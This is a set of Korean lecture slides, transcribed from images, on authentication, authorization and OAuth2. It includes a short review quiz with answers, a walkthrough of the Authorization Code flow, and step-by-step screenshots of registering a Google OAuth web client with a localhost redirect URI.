- 인증은 사용자의 신원을 확인하는 과정이며, 인가는 인증된 사용자의 접근 권한을 결정하는 과정이다.
- 세션 기반 인증은 서버에서 세션을 관리하며, 토큰 기반 인증은 클라이언트가 토큰을 저장하고 요청 시 전송한다.
- 보안 강화를 위해 다중 인증(MFA), 비밀번호 없는 인증, 생체 인증 등의 방식이 활용된다.
- XSS, CSRF, 세션 하이재킹, 리플레이 공격 등의 위협을 방어하기 위해 입력값 검증, 보안 쿠키 설정, 토큰 서명 검
증 등의 대책이 필요하다.
- 안전한 인증 시스템을 구축하려면 HTTPS/TLS를 통한 암호화, 최소 권한 원칙 적용, 이상 징후 모니터링이 필수
적이다.

---

## [2-SLIDES] 5주차 1차시 p.25 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지
안전한 소프트웨어의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 5주차 1차시 p.26 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 5주차 1차시 p.27 · 퀴즈
퀴즈
1. 다음 중 인증과 인가에 대한 설명 중 잘못된 것은?
1) 인증은 사용자에게 리소스 접근 가능한 권한을 부여하는 것 2) 인가는 권한을 제한하는 것도 포함함
3) 인증은 이 사람이 누구인가를 확인하는 과정 4) 인가를 통해 사용자를 등급별로 구분할 수 있게 됨
2. 사용자의 역할에 따라 접근 권한을 부여하는 방식을 나타내는 용어는? (영문 4글자)
( )
3. 다음중 인가 보안 위협에 대한 대응 방안은?
1) 최소권한의 원칙 2) 강력한 비밀번호 정책
3) CAPCHA 적용 4) 다중인증

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 원문 표기 그대로 — 3번 보기 3) 'CAPCHA'는 'CAPTCHA'의 오타. 2번은 빈칸 '(          )'에 답을 쓰는 주관식)

---

## [2-SLIDES] 5주차 1차시 p.28 · 퀴즈 정답
퀴즈 정답
1. 다음 중 인증과 인가에 대한 설명 중 잘못된 것은?
1)
인증은 사용자에게 리소스 접근 가능한 권한을 부여하는 것
인증을 통해 누구인지 확인한 다음, 인가 과정을 통해 그 사용자에게 허용둰 권한을 부여합니다.
2. 사용자의 역할에 따라 접근 권한을 부여하는 방식을 나타내는 용어는? (영문 4글자)
( RBAC )
3. 다음중 인가 보안 위협에 대한 대응 방안은?
1) 최소권한원칙
모든 사용자는 필요한 최소한의 권한만 부여

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[이미지 보충]** 정답 '1) 인증은 사용자에게 리소스 접근 가능한 권한을 부여하는 것', 'RBAC', '1) 최소권한원칙'은 빨간 글씨로 강조됨.
(※ 원문 표기 그대로 — 추출 텍스트의 '허용둰 권한'은 '허용된 권한'의 오타로 보이며, 렌더링 이미지에서는 해당 글자가 보이지 않고 '허용    권한'처럼 빈칸으로 표시됨)

# [2-SLIDES] 5주차 2차시 — 인증과 인가 · OAuth2 · JWT
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · MyBatis/마이바티스/Mapper/매퍼/#{}/${}/동적 SQL · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · JWT/JSON Web Token/제이더블유티/Claims/클레임/HS256/RS256/Refresh Token/리프레시 토큰 · Refresh Token/리프레시 토큰/토큰 회전/Rotation · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin

## [2-SLIDES] 5주차 2차시 p.1 · OAuth2 인증 및 인가
OAuth2 인증 및 인가
01 OAuth2 이해
02 OAuth2 구현
03 OAuth2 보안 위협 및 해결 방법

---

## [2-SLIDES] 5주차 2차시 p.2 · 학습 목표
학습 목표
OAuth2 개념과 필요성을 이해하고 설명할 수 있다.
OAUth2 프로세스 및 구성요소를 이해하고, 구현할 수 있다.
OAuth2 보안 위협을 이해하고 이에 대한 해결 방안을 설명할 수 있다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 원문 표기 그대로 — 두 번째 목표의 "OAUth2"는 "OAuth2"의 대소문자 오타로 보임)

---

## [2-SLIDES] 5주차 2차시 p.3 · 학습 내용
학습 내용
1. OAuth2 개념
2. OAuth2 구현
3. OAuth2 보안 위협 및 해결방법

---

## [2-SLIDES] 5주차 2차시 p.4 · OAuth2 인증 및 인가
OAuth2 인증 및 인가
01 OAuth2 이해
02 OAuth2 구현
03 OAuth2 보안 위협 및 해결 방법

---

## [2-SLIDES] 5주차 2차시 p.5 · OAuth2 란?
OAuth2 란?
정의
OAuth(Open Authorization)는 클라이언트 애플리케이션이 특정 리소스 소유자를 대신하여 서버 리소스에 액세서할 수 있는 권한
부여를 위한 개방형 표준.
사례)
사용자가 Google 계정을 이용해서 타사앱(B사의 애플리케이션)에 로그인하거나 데이터 공유
사용자가 GitHub 계정을 이용하여 CI/CD 툴(Jenkins)과 연동

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 원문 표기 그대로 — "액세서할"은 "액세스할"의 오타로 보임)

[이미지] 슬라이드 오른쪽 아래에 OAuth 2 로고(원형 배지 안에 큰 숫자 "2", 테두리에 "OAUTH" 글자)가 장식으로 들어 있음.

---

## [2-SLIDES] 5주차 2차시 p.6 · OAuth2 주요 구성요소
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

[도식] 네 구성요소와 그 사이 점선 화살표로 이루어진 관계도

| 구성요소 | 위치 | 설명 |
|---|---|---|
| **클라이언트 애플리케이션 (Client)** (APP 톱니바퀴 아이콘) | 왼쪽 위 | 리소스 소유자의 데이터를 요청하는 애플리케이션 (예: 모바일앱, 웹앱) |
| **리소스 서버 (Resource Server)** (노란색 서버 2대 아이콘) | 오른쪽 위 | 실제데이터를 가지고 있으며, 발급된 토큰을 검증하여 클라이언트의 요청을 허용하는 서버 |
| **리소스 소유자 (Resource Owner)** (사람 + 노트북·휴대폰 아이콘) | 왼쪽 아래 | 사용자(User) 또는 서비스, 리소스 (예: Google Drive, Github 등) |
| **권한서버 (Authorization Server)** (파란색 서버 아이콘) | 오른쪽 아래 | 인증을 수행하고 토큰을 발급하는 서버 (예: Google, Github, Facebook 등) |

화살표(점선) 흐름:
- 리소스 소유자 → 클라이언트 애플리케이션 : **서비스 액세스**
- 리소스 소유자 → 권한서버 : **액세스 권한**
- 권한서버 → 클라이언트 애플리케이션 : **인가코드/ 액세스 토큰 발급**
- 클라이언트 애플리케이션 → 리소스 서버 : **데이터 액세스**
- 리소스 서버 → 권한서버 : **대리인 인증권한 확인**

---

## [2-SLIDES] 5주차 2차시 p.7 · OAuth2 구성 요소
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 참여자 | 설명 | 역할 |
|---|---|---|
| 클라이언트 애플리케이션 (Client Application) | 리소스 소유자를 대신해 보호된 리소스에 접근하려는 애플리케이션 | 사용자 인증 및 권한 부여를 받아, Access Token을 획득하여 리소스 서버에 접근 |
| 리소스 소유자 (Resource Owner) | 리소스(데이터)를 소유한 사용자 | 자신의 리소스에 접근할 수 있도록 권한을 부여 |
| 권한 서버 (Authorization Server) | 사용자 인증과 권한 부여를 처리하고, Access Token을 발급하는 서버 | 클라이언트의 인증 요청을 검증하고, 적절한 Authorization Grant 또는 Access Token을 발급 |
| 리소스 서버 (Resource Server) | 보호된 리소스를 보유하고 있는 서버 | 클라이언트가 제출한 Access Token의 유효성을 확인한 후, 접근 요청에 따라 리소스를 제공 |

---

## [2-SLIDES] 5주차 2차시 p.8 · OAuth2 인증 흐름 : Authorization Code Grant
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

[도식] 네 참여자 사이를 번호 붙은 파란 화살표로 연결
- 왼쪽: 사용자 (Resource Owner)
- 가운데(APP 아이콘): 클라이언트 애플리케이션 (Client)
- 오른쪽 위: 리소스 서버 (Resource Server)
- 오른쪽 아래: 권한서버 (Authorization Server)

| 단계 | 방향 | 내용 |
|---|---|---|
| ① | 사용자 → 클라이언트 | 서비스 접근 |
| ② | 클라이언트 → 권한서버 | 인증 요청 페이지 redirect |
| ③ | 권한서버 → 사용자 | redirect된 페이지를 통해 로그인 요청 |
| ④ | 사용자 → 권한서버 | 로그인 정보 입력 |
| ⑤ | 권한서버 → 클라이언트 | Authorization Code 발급 |
| ⑥ | 클라이언트 → 권한서버 | Access Token 요청 |
| ⑦ | 권한서버 → 클라이언트 | Access Token 발급 |
| ⑧ | 클라이언트 → 리소스 서버 | Access Token으로 사용자 리소스 요청 |
| ⑨ | 리소스 서버 → 권한서버 | Access Token 검증 |
| ⑩ | 권한서버 → 리소스 서버 | Access Token 검증 OK |
| ⑪ | 리소스 서버 → 클라이언트 | 요청한 리소스 제공 |
| ⑫ | 클라이언트 → 사용자 | 보호된 서비스 이용 |

(②·⑥은 클라이언트→권한서버 방향 같은 화살표에, ⑤·⑦은 권한서버→클라이언트 방향 같은 화살표에 함께 표기됨. ⑤의 Authorization Code는 실제로는 다음 슬라이드처럼 사용자 브라우저의 redirect를 거쳐 클라이언트에 전달되며, 이 도식은 이를 단순화해 표현함)

---

## [2-SLIDES] 5주차 2차시 p.9 · OAuth2 인증 흐름 : Authorization Code Grant
OAuth2 인증 흐름 : Authorization Code Grant

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식] Authorization Code Grant 시퀀스 다이어그램 (영문). 참여자(왼쪽→오른쪽): **User**, **UserAgent (Browser)**, **Web Server (Client App)**, **Authorization Server**, **Resource Server**

| # | 보내는 쪽 → 받는 쪽 | 메시지 |
|---|---|---|
| 1 | User → UserAgent (Browser) | Enter URL |
| 2 | UserAgent → Web Server (Client App) | Open URL |
| 3 | Web Server → Web Server (자기 자신) | Start OAuth Process |
| 4 | Web Server → UserAgent | Redirect to AuthZ Server |
| 5 | UserAgent → Authorization Server | Opens redirect URL |
| 6 | Authorization Server → UserAgent | Present Authorization UI |
| 7 | UserAgent → User | Present Authorization UI |
| 8 | User → UserAgent | Present credentials and authorise or deny |
| 9 | UserAgent → Authorization Server | Present submitted data from user |
| 10 | Authorization Server → Authorization Server (자기 자신) | Verify and create Authorization code |
| 11 | Authorization Server → UserAgent | Redirect to Web Server with Authorization Code |
| 12 | UserAgent → Web Server | Follow redirect to Web Server |
| 13 | Web Server → Authorization Server | Present Authorization Code |
| 14 | Authorization Server → Web Server | Return Access Token |
| 15 | Web Server → Resource Server | Call protected resource with Access Token |
| 16 | Resource Server → Web Server | Return protected resource |

(※ 원문 표기 그대로 — "authorise"는 영국식 철자)
(앞 슬라이드 ①~⑫와의 대응: 1~2 ≈ ①, 4~5 ≈ ②, 6~7 ≈ ③, 8~9 ≈ ④, 11~12 ≈ ⑤, 13 ≈ ⑥, 14 ≈ ⑦, 15 ≈ ⑧, 16 ≈ ⑪. 이 다이어그램에는 ⑨⑩ 토큰 검증 단계가 따로 그려져 있지 않음)

---

## [2-SLIDES] 5주차 2차시 p.10 · OAuth2 의 장단점
OAuth2 의 장단점
OAuth2의 장점
〮 비밀번호 노출 위험 감소
사용자 비밀번호를 클라이언트에 전달하지 않고, 권한 서버에서만 관리하므로 보안성이 향상됨
〮 SSO (Single Sign-On) 지원
한 번의 로그인으로 여러 애플리케이션에 접근할 수 있어 사용자 편의성이 높아짐
〮 토큰 기반 인증
Access 토큰과 Refresh 토큰을 활용하여, 세션 관리 및 권한 검증을 효과적으로 수행,
유효기간을 짧게 운영하여 토큰 탈취 피해가 발생하더라도 피해를 최소화함
〮 다양한 클라이언트 지원
웹, 모바일, API 등 여러 클라이언트에 대해 유연하게 적용 가능하며, 확장성이 뛰어남
〮 외부 인증 연동 용이
소셜 로그인 및 다른 제3자 인증 시스템과 쉽게 통합

---

## [2-SLIDES] 5주차 2차시 p.11 · OAuth2 의 장단점
OAuth2 의 장단점
OAuth2 단점
〮 구현 복잡성
다양한 인증 흐름(Authorization Code, Implicit, Client Credentials 등)과 토큰 관리가 복잡하여 잘못 구현될 경우
보안 취약점이 발생할 수 있음
〮 클라이언트 비밀 관리 문제
모바일이나 공개 클라이언트의 경우, 태생적으로 클라이언트에 보관하는 토큰 등을 완벽하게 보호하기 어려움
〮 표준 해석의 차이
OAuth2는 표준 자체가 다소 유연하게 되어 있어서, 연동 시스템 간 구현의 차이 발생할 수 있음
〮 추가 보안 고려 필요
PKCE, 토큰 취소(Revocation), 타임스탬프/Nonce 등 추가 보안 대책이 없으면 리플레이 공격, 토큰 탈취 등의 위험이 존재
〮 서버 간 신뢰 관계 구성 필요
인증 서버와 리소스 서버 간의 신뢰가 깨지지 않도록 보안 구성이 탄탄하지 않으면 전체 시스템 보안이 위험할 수 있음

---

## [2-SLIDES] 5주차 2차시 p.12 · OAuth 와 OAuth2 비교
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 구분 | OAuth | OAuth2 |
|---|---|---|
| 보안 방식 | · 서명 기반 인증: 각 요청마다 HMAC-SHA1 등으로 서명을 생성하여 전송 / · 별도의 전송 보안 없이도 일정 수준의 보안 제공 | · 토큰 기반 인증: Access Token과 Refresh Token을 활용 / · HTTPS/TLS를 기본 전제 보안 수단으로 사용하여 전송 보안을 확보 |
| 구현 복잡성 | · 서명 계산 및 검증 과정으로 인해 구현 난이도가 높음 / · 클라이언트와 서버 모두에서 복잡한 암호화 로직 필요 | · 서명 계산 없이 토큰을 사용하기 때문에 구현이 간단함 / · 다양한 인증 흐름(Authorization Code, Implicit, Client Credentials, Resource Owner Password Credentials 등) 지원 |
| 유연성 및 확장성 | · 표준이 다소 엄격하여 확장에 한계가 있음 / · 일부 레거시 시스템에서 주로 사용 | · 현대 애플리케이션 환경(웹, 모바일, API 등)에 최적화된 유연한 설계 / · 추가 보안 강화 (예: PKCE)를 통해 공개 클라이언트 보안 강화 가능 |

(※ 검증: Python hmac/hashlib로 HMAC-SHA1 출력 길이 확인 — 20바이트(160비트). OAuth 1.0의 서명 방식(HMAC-SHA1 등) 설명과 일치)

---

## [2-SLIDES] 5주차 2차시 p.13 · OAuth2 인증 및 인가
OAuth2 인증 및 인가
01 OAuth2 이해
02 OAuth2 구현
03 OAuth2 보안 위협 및 해결 방법

---

## [2-SLIDES] 5주차 2차시 p.14 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
1. Google Cloud 가입 필요
https://cloud.google.com/apis?hl=ko

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[화면 캡처] 브라우저(Firefox)로 연 Google Cloud API 페이지
- 탭 제목: `Cloud API | Google Cloud`, 주소창: `https://cloud.google.com/apis?hl=ko`
- 상단 메뉴: Google Cloud 로고 | 개요 · 솔루션 · **제품**(선택됨, 밑줄) · 가격 책정 · 리소스 · 문의하기 | 검색 아이콘 · Docs · 지원 · 로그인 · [무료로 시작하기] 버튼
- 노란 배너: "Next '24를 놓치셨나요? 걱정하지 마세요. 이제 모든 세션을 주문형으로 이용할 수 있습니다. 지금 시청하세요. →"
- 본문 제목 **Google Cloud API**: "Google Cloud API를 사용하면 선호하는 언어를 사용하여 워크플로를 자동화할 수 있습니다. 널리 사용되는 프로그래밍 언어로 Cloud API를 REST 호출 또는 클라이언트 라이브러리와 함께 사용하세요." — 버튼 [Google Cloud 무료로 사용해 보기] [문서 보기]
- 오른쪽 상자 "다음으로 이동:" 클라우드 아키텍처 센터 / Cloud API 사용 / Google Cloud Marketplace
- 왼쪽 "필터링 기준 > 필터" 체크박스: AI 및 Machine Learning API, 컴퓨팅 API, 스토리지 및 데이터베이스 API, Networking API, 데이터 분석 API, 관리 도구 API
- 검색창("검색") 아래 **AI 및 Machine Learning API** 카드: Vertex AI API(최소한의 머신러닝 전문 지식과 수고로 고품질 커스텀 머신러닝 모델을 학습시킵니다.), 기반 모델 API(Vertex AI를 사용하여 특정 태스크에 맞게 조정하거나 맞춤설정할 수 있는 Gemini 모델을 비롯한 사전 학습된 멀티태스크 대규모 모델입니다.), Vision API(이미지 라벨 지정, 얼굴, 로고 및 랜드마크 인식, OCR, 선정적인 콘텐츠 인식 등을 앱에 통합합니다.), 그 아래 줄 Speech-to-Text API · Cloud Natural Language · Cloud Translation API(일부 잘림)
- 이 화면에서 오른쪽 위 '로그인'/'무료로 시작하기'로 Google Cloud 가입을 진행함

---

## [2-SLIDES] 5주차 2차시 p.15 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
2. 새 프로젝트 생성

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[화면 캡처 1 — 왼쪽] Google Cloud 콘솔 첫 화면 위에 뜬 **프로젝트 선택** 대화상자
- 탭 `환영합니다 – Google Cloud C...`, 주소창 `https://console.cloud.google.com/welcome?hl=ko&inv=1&invt=AbqlbA&organizationId=...`
- 상단 바: Google Cloud | [조직 없음] 프로젝트 선택기 | 검색창 "리소스, 문서, 제품 등 검색(/)" [검색]
- 대화상자: 제목 "프로젝트 선택", 검색칸 "프로젝트 및 폴더 검색", 탭 최근 · 별표표시됨 · **전체**(선택), 표 머리글 이름 | ID, 행 "조직 없음 | 0", 오른쪽 아래 [취소]
- **빨간 박스: 대화상자 오른쪽 위 [새 프로젝트] 버튼** → 클릭
- 뒤쪽 배경: "시작하기", "프로젝트를 만들...", [VM 만들기], "빠른 액세스" (API 및 서비스, Compute Engine, Cloud Storage, BigQuery) 등이 가려진 채로 보임

[화면 캡처 2 — 오른쪽] **새 프로젝트** 생성 양식
- 노란 경고: "projects 할당량이 12개 남았습니다. 할당량 증가를 요청하거나 프로젝트를 삭제하세요. 자세히 알아보기" / "Manage Quotas"
- **빨간 박스: 프로젝트 이름 \* = `OAuth2 Test`** (오른쪽 ? 도움말 아이콘)
- 그 아래 "프로젝트 ID: oauth2-test-452107. 나중에 변경할 수 없습니다. [수정]"
- 위치 \* : "조직 없음" [찾아보기] — "상위 조직 또는 폴더"
- **빨간 박스: [만들기] 버튼** (옆에 [취소])

(※ 검증: Python 정규식 `[a-z][a-z0-9-]{4,28}[a-z0-9]`로 프로젝트 ID `oauth2-test-452107` 확인 — 소문자로 시작·6~30자 규칙과 일치, 프로젝트 이름을 소문자·하이픈으로 바꾼 뒤 숫자 접미사가 붙은 형태)

---

## [2-SLIDES] 5주차 2차시 p.16 · Google OAuth 클라이언트 생성
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 5주차 2차시 p.16 · 3. 서비스 동의 및 시작

**API 및 서비스 > OAuth 동의 화면 선택**

[화면 캡처 1 — 왼쪽] Google Cloud 콘솔(프로젝트 `OAuth2 Test` 선택됨)의 왼쪽 탐색 메뉴
- 메뉴 항목: Cloud 개요 > · 솔루션 > · (고정된 제품) · **API 및 서비스 >** · 결제 · IAM 및 관리자 · Marketplace · Compute Engine > · Kubernetes Engine >
- **빨간 박스 1: "API 및 서비스"** 항목 → 마우스를 올리면 하위 메뉴가 펼쳐짐
- 하위 메뉴: 사용 설정된 API 및 서비스 · 라이브러리 · 사용자 인증 정보 · **OAuth 동의 화면** · 페이지 사용 동의
- **빨간 박스 2: "OAuth 동의 화면"** 선택
- 뒤쪽 대시보드: 탭 대시보드 · 활동 · 추천, "프로젝트 정보 — 프로젝트 이름 OAuth2 Test", "→ 프로젝트 설정으로 이동", API 카드, "리소스" 카드 등(일부 가려짐)

**Google 인증 플랫폼에서 아직 구성하지 않았을 경우 '시작하기' 눌러 설정**

[화면 캡처 2 — 오른쪽] Google 인증 플랫폼 / 개요 화면
- 상단: Google Cloud | 프로젝트 `OAuth2 Test` | 검색창 "리소스, 문서, 제품 등 검색(/)" [검색]
- 경로: Google 인증 플랫폼 / 개요
- 왼쪽 메뉴: **개요**(선택됨) · 브랜딩 · 대상 · 클라이언트 · 데이터 액세스 · 인증 센터
- 본문 "OAuth 개요": (액자 속 점선 구름 그림) "**Google 인증 플랫폼이 아직 구성되지 않음** — 시작하여 애플리케이션의 ID를 구성하고 Google API 호출 및 Google 계정으로 로그인에 사용할 사용자 인증 정보를 관리하세요. 자세히 알아보기"
- **빨간 박스: [시작하기] 버튼** 클릭

---

## [2-SLIDES] 5주차 2차시 p.17 · Google OAuth 클라이언트 생성
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 5주차 2차시 p.17 · 4. 프로젝트 구성

**앱 정보 > 앱 이름 : OAuth2 Test, 사용자 지원 이메일: 개인 메일 주소**

[화면 캡처 1 — 왼쪽] "프로젝트 구성" 마법사 1단계
- 탭 `프로젝트 구성 – Google 인증...`, 주소창 `https://console.cloud.google.com/auth/overview/create?hl=ko&inv=1&invt=AbqlbA&org...`
- 상단: Google Cloud | `OAuth2 Test` | 검색창에 "동의" 입력됨 [검색]
- 경로: Google 인증 플랫폼 / 개요 / 브랜딩 만들기
- 왼쪽 메뉴: 개요(선택) · 브랜딩 · 대상 · 클라이언트 · 데이터 액세스 · 인증 센터
- 단계: ❶ 앱 정보 → ❷ 대상 → ❸ 연락처 정보 → ❹ 완료, 맨 아래 [만들기] [취소]
- **빨간 박스: ❶ 앱 정보 영역**
  - 앱 이름 \* : `OAuth2 Test` — "동의를 요청하는 앱의 이름"
  - 사용자 지원 이메일 \* : `pineful@gmail.com` (드롭다운) — "사용자가 동의에 대해 문의하는 용도입니다. 자세히 알아보기"
  - [다음] 버튼

**대상 > 외부 선택**

[화면 캡처 2 — 오른쪽] 같은 마법사 2단계 (✔ 앱 정보 완료)
- ❷ 대상:
  - ○ 내부 ⓘ — "조직 내 사용자만 사용할 수 있습니다. 인증을 위해 앱을 제출할 필요는 없습니다. 사용자 유형 자세히 알아보기"
  - **빨간 박스: ◉ 외부 ⓘ (선택됨)** — "Google 계정이 있는 모든 테스트 사용자가 사용할 수 있습니다. 앱이 테스트 모드로 시작되고 테스트 사용자 목록에 추가된 사용자에게만 제공됩니다. 앱을 프로덕션에 푸시할 준비가 되면 앱을 인증해야 할 수도 있습니다. 사용자 유형 자세히 알아보기"
  - **빨간 박스: [다음] 버튼**
- 이어서 ❸ 연락처 정보, ❹ 완료

(캡처 속 메일 주소는 강사 본인 계정 예시이며, 실습 시에는 자신의 메일 주소 입력)

---

## [2-SLIDES] 5주차 2차시 p.18 · Google OAuth 클라이언트 생성
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 5주차 2차시 p.18 · 4. 프로젝트 구성

**연락처 정보: 개인 메일 주소**

[화면 캡처 1 — 왼쪽] "프로젝트 구성" 마법사 3단계 (주소창 `https://console.cloud.google.com/auth/overview/create?hl=ko&inv=1&invt=AbqlbA&org...`, 경로 Google 인증 플랫폼 / 개요 / 브랜딩 만들기)
- ✔ 앱 정보, ✔ 대상 완료
- **빨간 박스: ❸ 연락처 정보 영역**
  - 이메일 주소 \* : `pineful@gmail.com` (칩 형태, ⊗ 삭제 표시) — "이 이메일 주소는 Google에서 프로젝트 변경사항에 대해 알림을 보내기 위한 용도입니다."
  - [다음] 버튼
- ❹ 완료, 하단 [만들기] [취소]

**'만들기' 버튼 선택**

[화면 캡처 2 — 오른쪽] 마법사 4단계
- ✔ 앱 정보, ✔ 대상, ✔ 연락처 정보
- ❹ 완료: ☑ "Google API 서비스: 사용자 데이터 정책에 동의합니다." (체크됨) → [계속]
- **빨간 박스: 하단 [만들기] 버튼** (옆에 취소)

---

## [2-SLIDES] 5주차 2차시 p.19 · Google OAuth 클라이언트 생성
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 5주차 2차시 p.19 · 5. 클라이언트 만들기

**클라이언트 > + CREATE CLIENT 선택**

[화면 캡처 1 — 왼쪽] Google 인증 플랫폼 / 클라이언트 화면
- 탭 `클라이언트 – Google 인증 플랫...`, 주소창 `https://console.cloud.google.com/auth/clients?hl=ko&inv=1&invt=AbqlbA&organization...`
- 상단: Google Cloud | `OAuth2 Test` | 검색창 "사용자 인증 정보" [검색], 알림 배지 ②
- 왼쪽 메뉴: 개요 · 브랜딩 · 대상 · **클라이언트**(선택) · 데이터 액세스 · 인증 센터
- 툴바: 클라이언트 | **빨간 박스: [+ CREATE CLIENT]** | 🗑 삭제 | ↶ 삭제된 OAUTH 클라이언트 복원
- "OAuth 2.0 클라이언트 ID" 표 (이름 | 생성일 ↓ | 유형 | 클라이언트 ID | 작업): "표시할 OAuth 클라이언트가 없습니다."

**OAuth 클라이언트 ID 만들기**

[화면 캡처 2 — 가운데] 경로 Google 인증 플랫폼 / 클라이언트 / 클라이언트 만들기, 주소창 `https://console.cloud.google.com/auth/clients/create?hl=ko&inv=1&invt=AbqlbA&organ...`
- 제목 "← OAuth 클라이언트 ID 만들기"
- 안내: "클라이언트 ID는 Google OAuth 서버에서 단일 앱을 식별하는 데 사용됩니다. 앱이 여러 플랫폼에서 실행되는 경우 각각 자체 클라이언트 ID가 있어야 합니다. 자세한 내용은 OAuth 2.0 설정을 참조하세요. OAuth 클라이언트 유형을 자세히 알아보세요."
- 애플리케이션 유형 \* : **웹 애플리케이션** (드롭다운, 파란 테두리로 포커스)
- 이름 \* : `웹 클라이언트 1` — "OAuth 2.0 클라이언트의 이름입니다. 이 이름은 콘솔에서 클라이언트를 식별하는 용도로만 사용되며 최종 사용자에게 표시되지 않습니다."
- ⓘ "아래에 추가한 URI의 도메인이 승인된 도메인으로 OAuth 동의 화면에 자동으로 추가됩니다."
- 승인된 JavaScript 원본 ⓘ — "브라우저 요청에 사용" [+ URI 추가]
- 승인된 리디렉션 URI ⓘ (아래로 이어짐)

**애플리케이션 유형을 '웹 애플리케이션'으로 선택, 이름 디폴트 그대로**

**승인된 리디렉션 URI' 항목에 아래 URI 입력**
(※ 원문 표기 그대로 — 여는 작은따옴표 없이 닫는 따옴표만 있음)

[화면 캡처 3 — 오른쪽] 저장 후의 "← 웹 애플리케이션의 클라이언트 ID" 화면 (🗑 삭제 버튼)
- 탭 2개: `웹 애플리케이션의 클라이언트`, `G 로그인 - Google 계정`
- 주소창 `https://console.cloud.google.com/auth/clients/131457979987-4eg2qpr3kuodbf3eeorjsq3p46u8pv2v.ap...`
- 경로: Google 인증 플랫폼 / 클라이언트 / 클라이언트: `131457979987-4eg2qpr3kuodbf3eeorjsq3p46u8pv2v.apps.googleusercontent.com`
- 승인된 JavaScript 원본 ⓘ — "브라우저 요청에 사용" [+ URI 추가] (비어 있음)
- 승인된 리디렉션 URI ⓘ — "웹 서버의 요청에 사용"
- **빨간 박스: URI 1 \* = `http://localhost:8000/login/oauth2/code/google`**, 아래 [+ URI 추가]
- "참고: 설정이 적용되는 데 5분에서 몇 시간이 걸릴 수 있습니다." [저장] [취소]

```
http://localhost:8000/login/oauth2/code/google
```

(※ 검증: Python urlparse로 확인 — scheme=http, host=localhost, port=8000, path=/login/oauth2/code/google. Spring Security OAuth2 Client의 기본 리디렉션 URI 템플릿 `{baseUrl}/login/oauth2/code/{registrationId}`에 registrationId=`google`을 넣은 형태와 일치. 실습 서버를 8000 포트로 띄운다는 전제)
(※ 검증: Python 정규식으로 클라이언트 ID `131457979987-4eg2qpr3kuodbf3eeorjsq3p46u8pv2v.apps.googleusercontent.com` 확인 — `숫자-32자.apps.googleusercontent.com` 형식과 일치, 다음 슬라이드 목록의 `131457979987-4eg2...`와도 앞부분 일치)

---

## [2-SLIDES] 5주차 2차시 p.20 · Google OAuth 클라이언트 생성
Google OAuth 클라이언트 생성
5. 클라이언트 만들기(계속)
OAuth 2.0 클라이언트 ID 생성 확인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[화면 캡처] 생성 완료 후 Google 인증 플랫폼 / 클라이언트 목록
- 탭 `클라이언트 – Google 인증 플랫...`, 주소창 `https://console.cloud.google.com/auth/clients?highlightClient=131457979987-4eg2qpr3k...`
- 상단: Google Cloud | `OAuth2 Test` | 검색창 "사용자 인증 정보" [검색], 알림 배지 ②
- 왼쪽 메뉴: 개요 · 브랜딩 · 대상 · **클라이언트**(선택) · 데이터 액세스 · 인증 센터
- 툴바: 클라이언트 | + CREATE CLIENT | 🗑 삭제 | ↶ 삭제된 OAUTH 클라이언트 복원
- **OAuth 2.0 클라이언트 ID** 표

| 이름 | 생성일 ↓ | 유형 | 클라이언트 ID | 작업 |
|---|---|---|---|---|
| 웹 클라이언트 1 (링크) | 2025. 2. 26. | 웹 애플리케이션 | 131457979987-4eg2... (복사 아이콘) | ✏ 편집 · 🗑 삭제 · ⬇ 다운로드(JSON) |

- 화면 아래 토스트 메시지: "OAuth 클라이언트 생성됨" ✕

